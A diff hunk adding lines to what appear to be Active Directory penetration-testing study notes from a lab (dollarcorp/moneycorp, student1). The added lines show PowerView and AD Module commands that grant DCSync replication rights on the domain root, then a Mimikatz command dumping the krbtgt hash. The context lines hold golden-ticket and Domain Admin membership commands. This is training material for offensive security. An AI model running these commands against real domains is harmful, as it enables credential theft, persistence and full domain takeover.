@@ -496,3 +496,19 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - After having full control over the Domain, we can add the members in Domain Admin Groups
 - Using PowerView: `Add-DomainGroupMember -Identity 'Domain Admins' -Members testuser -Verbose`
 - Using AD Module: `Add-ADGroupMember -Identity 'Domain Admins' -Members testuser`
+
+- There are even more interesting ACLs which can be abused.
+- For example, with DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run "DCSync"
+- We do not need to provide Full Control to perform DCSync attack. Only below rights are enough for DCSync privileges.
+  - Replicating Directory Changes
+  - Replicating Directory Changes All
+  - Replicating Directory Changes in Filtered Set
+
+**Add rights for DCSync**
+- Using Powerview: `Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student1 -Rights DCSync -Verbose`
+- Using AD Module: `Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -GUIDRight DCSync -Verbose`
+
+- This should provide us the capability to use DCSync without having Domain Admin privileges.
+- Execute DCSync
+  - `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`
+  - 
